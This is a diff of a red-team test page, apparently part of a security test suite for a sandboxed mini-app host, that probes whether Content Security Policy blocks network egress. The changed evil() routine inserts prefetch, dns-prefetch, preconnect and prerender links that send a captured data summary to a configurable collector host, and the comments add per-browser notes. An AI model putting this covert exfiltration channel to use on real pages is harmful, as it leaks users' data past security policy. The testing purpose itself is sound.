@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>evil-02 CSP & network egress</title>
-<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC (no directive covers it) and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381), probed by a kehto/web#393-mirror nested-context bypass battery that also carries the XML-parser sinks (XSLT, XML-namespace DOMParser, DTD entities) a factory-pin + Trusted Types layer does not reach.">
+<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC (no directive covers it) and the grandchild-frame fresh-realm WebRTC vector (kehto/web#381), probed by a kehto/web#393-mirror nested-context bypass battery that also carries the XML-parser sinks (XSLT, XML-namespace DOMParser, DTD entities) a factory-pin + Trusted Types layer does not reach, plus resource-hint egress (prefetch/dns-prefetch/preconnect/prerender) that default-src 'none' does not reliably govern.">
 <meta name="napplet-id" content="evil-02-csp-egress">
 <!--
   evil-napplets ROE (see repo README):
@@ -126,6 +126,7 @@
   .chip.sev-critical { color: var(--danger); }
   .chip.sev-high { color: var(--warn); }
   .chip.sev-info { color: var(--muted); }
+  .chip.window-level { color: var(--muted); border-style: dashed; }
   .evidence {
     color: var(--muted);
     font-size: 11px;
@@ -828,30 +829,40 @@ const ATTACKS = [
     },
   },
   {
-    id: 'prefetch-hint',
-    name: 'prefetch / dns-prefetch hints',
-    target: 'no CSP directive governs prefetch',
+    id: 'resource-hints',
+    name: 'resource hints — prefetch / dns-prefetch / preconnect / prerender',
+    target: 'default-src \'none\' does not reliably govern resource hints',
     severity: 'low',
-    harm: 'Prefetch and dns-prefetch hint loads are not observable as fetches and not covered by connect-src — a covert egress/traffic-shaping channel.',
+    harm: 'Resource-hint loads are not observable as fetches from inside the frame and are not reliably governed by the napplet CSP. CSP3 ED (w3c/webappsec-csp@e3461f7) places prefetch/prerender under default-src, so a browser that lets them through under default-src \'none\' is non-conformant. prerender issues a real HTTP GET (Sec-Purpose: prefetch) in Chromium; preconnect opens a TCP connection (WebKit) or DNS+TCP (Chromium with network prediction); dns-prefetch resolves DNS (Chromium with prediction, Firefox with DNS prefetch enabled) — a covert egress / traffic-shaping channel per engine (see ROADMAP finding 15 for the table).',
+    evilBrief: 'Inserts prefetch, dns-prefetch, preconnect, and prerender hint links at the collector — point the collector at a local sink (http(s)/TCP/DNS) to OBSERVE the egress rather than assume it. prerender carries the captured summary in the query string of a real HTTP GET.',
     async demo() {
       const inserted = [];
-      const before = { ok: true };
-      for (const rel of ['prefetch', 'dns-prefetch']) {
+      // Local-sink mode: egress is observed OUTSIDE the frame (no in-frame
+      // violation/load event), so demo mode points the hints at the
+      // non-resolving NX host and stays honest — na, not armed.
+      for (const rel of ['prefetch', 'dns-prefetch', 'preconnect', 'prerender']) {
         const link = document.createElement('link');
         link.rel = rel;
         link.href = NX + '?ev=' + rel;
         document.head.appendChild(link);
         inserted.push(rel);
-        setTimeout(() => link.remove(), 1000);
+        setTimeout(() => { try { link.remove(); } catch (_) {} }, 1200);
       }
-      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event). CSP does not govern prefetch: treat the channel as open unless your platform blocks hints (Permissions-Policy / browser flags)');
+      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event, no error). CSP does not reliably govern resource hints: point the collector at a local sink to OBSERVE the egress (prerender → HTTP GET with Sec-Purpose; preconnect → TCP; dns-prefetch → DNS). Playwright\'s default context disables network prediction, so run the real Chromium channel with --enable-features=NetworkPrediction to see preconnect/dns-prefetch; prerender fires regardless. Per-engine table in ROADMAP finding 15.');
     },
     async evil() {
-      const link = document.createElement('link');
-      link.rel = 'prefetch';
-      link.href = state.collector + '?ev=prefetch-exfil&payload=' + encodeURIComponent(captureSummary().slice(0, 512));
-      document.head.appendChild(link);
-      return { result: 'prefetch hint exfil dispatched to ' + state.collector };
+      const summary = encodeURIComponent(captureSummary().slice(0, 512));
+      const fired = [];
+      for (const rel of ['prefetch', 'dns-prefetch', 'preconnect', 'prerender']) {
+        const link = document.createElement('link');
+        link.rel = rel;
+        // prerender/prefetch carry the payload in a real request URL; preconnect/
+        // dns-prefetch only reach the host (TCP/DNS), so the host itself is the signal.
+        link.href = state.collector + '?ev=' + rel + '-exfil&payload=' + summary;
+        document.head.appendChild(link);
+        fired.push(rel);
+      }
+      return { result: 'resource-hint exfil dispatched to ' + state.collector + ' (' + fired.join(', ') + ') — observe at the sink; prerender carries the payload in an HTTP GET' };
     },
   },
 ];
@@ -877,12 +888,14 @@ const ATTACKS = [
       const div = document.createElement('div');
       div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
       div.dataset.attack = a.id;
+      if (a.windowLevel) div.dataset.windowLevel = '1';
       div.dataset.status = r.status || (a.autoRun === false ? 'ready' : 'pending');
       div.innerHTML =
         '<div class="attack-head">' +
           statusChip(r.status) +
           '<span class="attack-name">' + esc(a.name) + '</span>' +
           sevChip(a.severity) +
+          (a.windowLevel ? '<span class="chip window-level" title="posts a window-level message to the parent: runs last in the sweep (a port-bound NIP-5D shell may revoke on it)">window-level</span>' : '') +
           '<span class="spacer"></span>' +
           '<div class="row-actions"><button data-probe="' + a.id + '" type="button">' + (a.autoRun === false ? 'detonate' : 'probe') + '</button></div>' +
         '</div>' +
@@ -944,8 +957,26 @@ const ATTACKS = [
     render();
     updateReport();
   }
+  /* window-level rows (windowLevel: true) post a message to the parent
+     Window instead of riding the injected API / napplet.hello port. A
+     port-bound NIP-5D shell may treat that as replacement evidence and revoke
+     (tearing this frame down), so the sweep runs them LAST, or not at all
+     with evil-window-level=skip (napplet/evil#3). Manual probes still run. */
+  function windowLevelMode() {
+    const v = String(evilParam('evil-window-level') || '').trim().toLowerCase();
+    return v === 'skip' ? 'skip' : 'last';
+  }
   async function runAllDemos() {
-    for (const a of ATTACKS) if (a.autoRun !== false) await runDemo(a.id);
+    const auto = ATTACKS.filter((a) => a.autoRun !== false);
+    const late = auto.filter((a) => a.windowLevel);
+    if (windowLevelMode() === 'skip') {
+      for (const a of late) state.results[a.id] = na('skipped: window-level probe (evil-window-level=skip) — a port-bound NIP-5D shell may revoke on it; use the probe button to run it');
+      render();
+      updateReport();
+    }
+    for (const a of auto) if (!a.windowLevel) await runDemo(a.id);
+    if (windowLevelMode() === 'skip') return;
+    for (const a of late) await runDemo(a.id);
   }
 
   /* ---------- VERY EVIL ---------- */
